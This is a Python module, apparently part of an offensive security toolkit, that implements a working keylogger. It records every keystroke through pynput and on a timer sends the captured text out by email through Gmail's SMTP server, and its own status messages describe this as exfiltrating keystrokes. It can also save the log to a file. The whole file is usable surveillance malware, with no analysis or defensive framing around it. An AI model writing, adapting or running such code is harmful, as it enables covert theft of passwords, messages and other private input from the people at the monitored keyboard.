#!/usr/bin/env python3
import os
import smtplib
import threading
from core.banner import info, success, warn, error

class AsyncKeylogger:

    def __init__(self, interval, email=None, password=None, local_file=None):
        self.interval = interval
        self.email = email
        self.password = password
        self.local_file = local_file
        self.log = '[Keylogger initialized]\n'
        self.timer = None
        self.running = False

    def append_to_log(self, text):
        self.log += text

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = ' '
            elif key == key.enter:
                current_key = '\n'
            else:
                current_key = f' [{key}] '
        self.append_to_log(current_key)

    def send_mail(self, message):
        if not (self.email and self.password):
            return
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(self.email, self.password)
        subject = 'Subject: NetworkSecurity Keylogger Dispatch\n\n'
        server.sendmail(self.email, self.email, subject + message)
        server.quit()

    def report(self):
        if not self.running:
            return
        if self.log.strip():
            if self.email and self.password:
                try:
                    self.send_mail(self.log)
                except Exception as e:
                    warn(f'Failed to email keylogger report: {e}')
            elif self.local_file:
                try:
                    with open(self.local_file, 'a', encoding='utf-8') as f:
                        f.write(self.log)
                except Exception as e:
                    warn(f'Failed to write to local log: {e}')
            else:
                print(f'\n[Keylogger Buffer Flush]:\n{self.log}\n')
            self.log = ''
        if self.running:
            self.timer = threading.Timer(self.interval, self.report)
            self.timer.daemon = True
            self.timer.start()

    def start(self):
        try:
            import pynput.keyboard
        except ImportError:
            error('pynput is required for keylogger. Install via: pip install pynput')
            return 1
        self.running = True
        self.report()
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            try:
                keyboard_listener.join()
            except KeyboardInterrupt:
                self.running = False
                if self.timer:
                    self.timer.cancel()
                info('\nKeylogger listener stopped.')
        return 0

def run(args):
    interval = args.interval or 60
    email = args.email
    password = args.password
    local_log = args.local_log
    if email and (not password):
        error('SMTP password (-p / --password) is required when email is specified.')
        return 1
    info(f'Starting Keylogger (Reporting interval: {interval} seconds)...')
    if email:
        info(f'Exfiltrating captured keystrokes to: {email}')
    elif local_log:
        info(f'Writing captured keystrokes to local file: {local_log}')
    else:
        info('No email or logfile provided. Logs will flush to stdout buffer.')
    info('Press Ctrl+C to terminate keylogger.')
    kl = AsyncKeylogger(interval, email=email, password=password, local_file=local_log)
    return kl.start()
